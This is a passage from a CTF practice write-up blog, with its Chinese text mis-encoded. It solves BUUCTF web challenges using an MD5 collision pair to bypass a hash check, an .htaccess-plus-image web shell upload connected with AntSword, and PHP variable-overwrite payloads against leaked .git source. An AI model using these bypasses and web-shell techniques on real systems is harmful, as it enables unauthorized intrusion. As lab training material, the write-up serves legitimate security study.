<p>åœ¨md5é‡Œæœ‰ä¸€äº›md5ä¸²ç¼–ç ä¸åŒä½†å€¼ç›¸åŒ,å°±å¯ä»¥ç”¨æ¥ç¢°æ’ç»•è¿‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
<p>éœ€è¦æŠ“åŒ…æ”¹æˆpostä¼ å‚<br><figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./21.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./21.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure></p>
<p>flag{5e4e259d-460a-4ca9-ab42-9641bf7f9179}</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><a href="http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn" target="_blank" rel="noopener">http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn</a></p>
<p>å°è¯•ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡é©¬,æç¤ºè¯´åç¼€åä¸èƒ½æœ‰ph</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./22.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./22.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>é‚£å°±ä¸Šä¼ .htaccess</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./23.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./23.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>å†æŠŠå›¾ç‰‡ä¸Šä¼ </p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./24.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./24.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>èšå‰‘è¿ä¸Š</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./25.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./25.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>flag{4d82a478-0cbd-41f0-ab29-ae2d943d8705}</p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><a href="http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn" target="_blank" rel="noopener">http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn</a></p>
<p>é¡µé¢æ²¡å•¥åˆ©ç”¨ç‚¹,æˆ‘çš„æ‰«æå™¨ç»å¸¸æ‰«ä¸åˆ°.git,è¿˜æ˜¯ç”¨è‡ªå·±çš„è„šæœ¬æ‰«ä¸‹ç›®å½•</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./26.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./26.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>ä¸€å †å¼±ç›¸åº”,ä½†å­˜åœ¨.git,ç”¨githackæ¢å¤,çœ‹åˆ°æœ‰flag.phpæ–‡ä»¶,ä½†æ²¡æ¢å¤å‡ºæ¥</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./27.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./27.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>ä»¥å‰åšé¢˜å¥½åƒä¹Ÿæœ‰è¿™ç§æƒ…å†µ,ç¿»äº†ç¿»ä»¥å‰çš„<a href="http://www.damyahome.top/8307%E5%92%8C8302%E9%9D%B6%E5%9C%BAweb%E9%A2%98wp/" target="_blank" rel="noopener">æ–‡ç« </a></p>
<p>å°è¯•ç”¨gittoolå·¥å…·é‡Œçš„Dumperå’ŒExtractorè·å¾—å®Œæ•´æºç ,å¤±è´¥</p>
<p>å¥‡æ€ªäº†å°±æ˜¯æ¢å¤ä¸è¿‡æ¥,æˆ‘æ¢é¶æœºä¹Ÿæ¢å¤ä¸è¿‡æ¥,åªèƒ½çœ‹ç€åˆ«äººåšå®¢çš„æºç </p>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line"><span class="comment">//flag.phpåªèµ·åˆ°ä¸€ä¸ªè¾“å‡ºä½œç”¨</span></span><br></pre></td></tr></table></figure>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//htmlç•¥</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ”¯æŒgetå’Œpostä¼ å‚çš„æ•°ç»„éå†</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">exit</span>($handsome);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">Â  Â  <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>Â  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">Â  Â  <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿˜åŠ äº†ä¸‰å±‚è¿‡æ»¤è§„åˆ™</span></span><br><span class="line"><span class="comment">//1.ä¸ç®¡æ˜¯getè¿˜æ˜¯post,flagéƒ½ä¸èƒ½ç­‰äºflag,å¦åˆ™é€€å‡º</span></span><br><span class="line"><span class="comment">//2.æ£€æµ‹getæˆ–postæ˜¯å¦æœ‰flag,æ²¡æœ‰åˆ™é€€å‡º</span></span><br><span class="line"><span class="comment">//3.å¦‚æœgetçš„flagä¸ç­‰äºflag,é€€å‡º</span></span><br><span class="line"><span class="comment">//ä¹Ÿå°±æ˜¯è¦æ±‚getçš„flag=flag,ä½†ä¸èƒ½postæˆ–è€…getçš„flag=flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure></p>
<p>çœ‹ä¸€ä¸‹foreachå‡½æ•°,åœ¨ä¸æ”¹å˜flagçš„æƒ…å†µä¸‹exit()ä¹Ÿèƒ½ä½œä¸ºè¾“å‡º,æœ¬é¢˜çš„æ€è·¯å°±æ˜¯å˜é‡è¦†ç›–<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach</span><br><span class="line">(PHP 4, PHP 5, PHP 7)</span><br><span class="line">foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚foreach ä»…èƒ½å¤Ÿåº”ç”¨äºæ•°ç»„å’Œå¯¹è±¡ï¼Œå¦‚æœå°è¯•åº”ç”¨äºå…¶ä»–æ•°æ®ç±»å‹çš„å˜é‡ï¼Œæˆ–è€…æœªåˆå§‹åŒ–çš„å˜é‡å°†å‘å‡ºé”™è¯¯ä¿¡æ¯ã€‚æœ‰ä¸¤ç§è¯­æ³•ï¼š</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">Â  Â  statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">Â  Â  statement</span><br><span class="line">ç¬¬ä¸€ç§æ ¼å¼éå†ç»™å®šçš„ array_expression æ•°ç»„ã€‚æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ $value å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ï¼ˆå› æ­¤ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å°†ä¼šå¾—åˆ°ä¸‹ä¸€ä¸ªå•å…ƒï¼‰ã€‚</span><br><span class="line">ç¬¬äºŒç§æ ¼å¼åšåŒæ ·çš„äº‹ï¼Œåªé™¤äº†å½“å‰å•å…ƒçš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ $keyã€‚</span><br></pre></td></tr></table></figure></p>
<h3 id="æ–¹æ³•ä¸€-GET"><a href="#æ–¹æ³•ä¸€-GET" class="headerlink" title="æ–¹æ³•ä¸€:GET"></a>æ–¹æ³•ä¸€:GET</h3><p>geté‡Œåªè¦èƒ½æ„æˆå˜é‡è¦†ç›–,ç”¨$ydsæˆ–$iséƒ½è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯yds=flag<br>$x=yds,$y=flag,æ‰€ä»¥$$x=$yds,$$y=$flag</p>
<p>$$x = $$y,ä¹Ÿå°±æ˜¯$yds=$flag</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yds=flag</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯is=flag<br>$x=is,$y=flag,æ‰€ä»¥$$x=$is,$$y=$flag</p>
<p>$$x = $$y,ä¹Ÿå°±æ˜¯$is=$flag</p>
<p>åˆå› ä¸ºè¦æ±‚flag=flag,æ‰€ä»¥$x=flag,$y=flag,å¸¦è¿›å»å˜æˆ$flag=$flag</p>
<p>å°†ä¸¤ç§æƒ…å†µè¿æ¥èµ·æ¥</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./28.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./28.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>flag{64be7429-88b0-4318-8e17-3a7efb7a540a}</p>
<h3 id="æ–¹æ³•äºŒ-GET-POST"><a href="#æ–¹æ³•äºŒ-GET-POST" class="headerlink" title="æ–¹æ³•äºŒ:GET+POST"></a>æ–¹æ³•äºŒ:GET+POST</h3><p>åœ¨posté‡Œä¹Ÿå¯ä»¥è¿›è¡Œä¸€æ¬¡å˜é‡è¦†ç›–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">$$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>éœ€è¦postä¸€ä¸ªç­‰å¼ä½¿å¾—æ‰§è¡Œåä¸º$$flag=$flag,å³$flag=flag<br>ç„¶ågetä¼ å‚ä¸ºyds=flag,è¯¦ç»†çœ‹æ–¹æ³•ä¸€</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">yds=flag</span><br><span class="line">POST:</span><br><span class="line">$flag=flag</span><br></pre></td></tr></table></figure>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    æœ€åæ›´æ–°æ—¶é—´ï¼š<time datetime="2020-10-07T13:20:27.489Z" itemprop="dateUpdated">2020-10-07 21:20:27</time>
</span><br>


        
        è½¬è½½æ³¨æ˜å‡ºå¤„ï¼ŒåŸæ–‡åœ°å€ï¼š<a href="/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/" target="_blank" rel="external">http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/</a>
        
    </div>
    <footer>
        <a href="http://www.damyahome.github.io">
            <img src="/img/avatar.jpg" alt="Damya">
            Damya
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">èµ</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ä¸ªäººctfç«èµ›/">ä¸ªäººctfç«èµ›</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=ã€ŠBUUCTF webç»ƒä¹ 5ã€‹ â€” Damya's Blog&pic=http://www.damyahome.github.io/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=ã€ŠBUUCTF webç»ƒä¹ 5ã€‹ â€” Damya's Blog&source=åœ¨é‚£è¿œæ–¹çš„å¤©ç©ºä¹‹ä¸‹ï¼Œä¸€æœµå°èŠ±å…‰é²œäº®ä¸½ã€‚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/AWD/ckwd5kuf800075cuct8brazsm/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">10.8 é˜Ÿå†…AWDå°ç»“</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/ctf-writeup-web/ckwd5kugp001r5cucudzqw5d0/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">BUUCTF webç»ƒä¹ 4</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>ç›®å½•</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GYCTF2020-Blacklist"><span class="post-toc-number">1.</span> <span class="post-toc-text">[GYCTF2020]Blacklist</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><span class="post-toc-number">2.</span> <span class="post-toc-text">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><span class="post-toc-number">3.</span> <span class="post-toc-text">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•ä¸€-åˆ©ç”¨å¸¸é‡å‡½æ•°"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">æ–¹æ³•ä¸€:åˆ©ç”¨å¸¸é‡å‡½æ•°</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•äºŒ-åˆ©ç”¨session"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">æ–¹æ³•äºŒ:åˆ©ç”¨session</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MRCTF2020-Ez-bypass"><span class="post-toc-number">4.</span> <span class="post-toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#De1CTF-2019-SSRF-Me"><span class="post-toc-number">5.</span> <span class="post-toc-text">[De1CTF 2019]SSRF Me</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•ä¸€-å“ˆå¸Œæ‹“å±•æ”»å‡»"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">æ–¹æ³•ä¸€:å“ˆå¸Œæ‹“å±•æ”»å‡»</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•äºŒ-å­—ç¬¦ä¸²æ‹¼æ¥"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">æ–¹æ³•äºŒ:å­—ç¬¦ä¸²æ‹¼æ¥</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•ä¸‰-local-file"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">æ–¹æ³•ä¸‰:local_file</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#å®‰æ´µæ¯-2019-easy-web"><span class="post-toc-number">6.</span> <span class="post-toc-text">[å®‰æ´µæ¯ 2019]easy_web</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GXYCTF2019-BabyUpload"><span class="post-toc-number">7.</span> <span class="post-toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="post-toc-number">8.</span> <span class="post-toc-text">[BJDCTF2020]Mark loves cat</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•ä¸€-GET"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">æ–¹æ³•ä¸€:GET</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ–¹æ³•äºŒ-GET-POST"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">æ–¹æ³•äºŒ:GET+POST</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        è®©è¿™ä¸ªä¸–ç•Œçš„bugæœ‰è¶£ä¸€ç‚¹
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="æ‰“èµäºŒç»´ç ">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">å¾®ä¿¡</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">æ”¯ä»˜å®</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Linksï¼š</span>
    
    <span class="blogroll-item">
        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.virzz.com/" target="_blank">Virink</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Damya &copy; 2018 - 2021
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="æ€»è®¿å®¢é‡">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="æ€»è®¿é—®é‡">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=ã€ŠBUUCTF webç»ƒä¹ 5ã€‹ â€” Damya's Blog&pic=http://www.damyahome.github.io/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=ã€ŠBUUCTF webç»ƒä¹ 5ã€‹ â€” Damya's Blog&source=åœ¨é‚£è¿œæ–¹çš„å¤©ç©ºä¹‹ä¸‹ï¼Œä¸€æœµå°èŠ±å…‰é²œäº®ä¸½ã€‚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrElEQVR42u3aQW4bMRAEQP//0845h5W6Z0hFCGpPgr0SWTyQgx7+/MTP78Pz9M7rv7TvP4147MHDw8M7NPV8mNeA5HM+ev4tPDw8vNu8px316Z3X38o39NeM5IB5Mys8PDy8r+G9ZiekvETGw8PD+z94bbm8jzzw8PDwvo2X/3QewibRQ1tYX8xa8PDw8GJevmV/z+cr/T08PDy8dVc92XCTeDf/nSTGLWaLh4eHd4GXb7htkNoGCpso+U1AjIeHh3eN18YNSWQwOx5mc3hcCDw8PLwLvGRybVSxKc3bELkIcPHw8PDWvH3LatOsyg+PpFVWF9N4eHh4a97+6sCsOJ5dzzrWAMPDw8NbI2cTypejvZRw4OoVHh4e3gd57TGQv9O2zdpApBgYDw8Pb53Qngpe26m0VwTy8AIPDw/vHi8pgmeBwqYlduoyFh4eHt493r6V1V4CyBe0bYzh4eHh3eAlPzcLFPISPI9Chq0vPDw8vGu8fcnbLtae+qagx8PDw7vGy2H7BtiGlBwPf72Jh4eHd43X5hb5MHm8m0cPwzACDw8P7xqv3aBnwe7mskJy8AxvN+Dh4eHFWWi7+W6aWKf6+3h4eHjfw0sm2g7ZFtOn2nh4eHh493h5uTxr6p+9rpocY3h4eHi3eQmpbYy1xfHmAtabJcbDw8O7zJsFrMkBM5tuu/R4eHh4n+dtppVMYrYEbTDxpqTGw8PDW/B+y2e4fuVenYS/UYSBh4eHd4E323DbSCIZOG+SDS8Q4OHh4R3lJYdB/rldv9mVr+JqFx4eHt413qnCNw92TwUQ0cGAh4eH9095eW0+i3rbYv3wwYCHh4f3QV7+O6+PmeS/xeGEh4eHd42XD5M3nNpLqJs440DWgoeHh3fmu1EJ20YSyaWrA5PGw8PDO8/7A+zc2O7kv0skAAAAAElFTkSuQmCC" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = 'ç­‰ä½ å›æ¥å‘€~';
                clearTimeout(titleTime);
            } else {
